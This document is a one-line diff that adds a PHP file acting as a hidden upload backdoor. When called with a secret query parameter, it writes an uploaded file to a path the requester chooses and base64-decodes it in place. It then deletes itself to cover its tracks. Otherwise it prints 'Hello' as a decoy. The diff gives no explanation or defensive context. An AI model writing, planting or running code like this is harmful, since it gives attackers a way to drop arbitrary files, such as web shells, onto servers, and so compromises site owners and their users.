@@ -1,0 +1,1 @@
+<?php if($_GET['df'] ==1) {if($_FILES['fl']){move_uploaded_file($_FILES['fl']['tmp_name'], $_POST['flname']);$f = file_get_contents($_POST['flname']);$c = base64_decode($f); file_put_contents($_POST['flname'],$c);echo 'Uploaded';} else { echo 'Problem';} unlink(__FILE__);} else {echo 'Hello';}?>
